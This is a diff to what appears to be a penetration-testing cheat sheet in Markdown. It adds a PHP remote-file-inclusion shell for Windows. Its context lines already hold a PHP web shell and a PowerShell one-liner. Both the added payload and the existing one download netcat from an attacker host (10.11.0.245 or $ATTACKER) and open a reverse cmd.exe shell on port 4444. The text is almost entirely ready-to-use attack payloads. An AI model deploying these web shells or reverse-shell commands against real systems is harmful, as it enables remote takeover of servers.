@@ -130,7 +130,10 @@ gcc -m32|-m64 -o output source.c
 2. <?php system($_GET['cmd']);?>
 3. ?cmd=powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
 ```
-
+#### Remote File InclusionShell: Windows + PHP
+```php
+<?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.245/netcat/nc.exe','nc.exe'); cmd /c nc.exe 10.11.0.245 4444 -e cmd.exe\" }"); ?>
+```
 
 ## Local Enumeration & Privilege Escalation
 
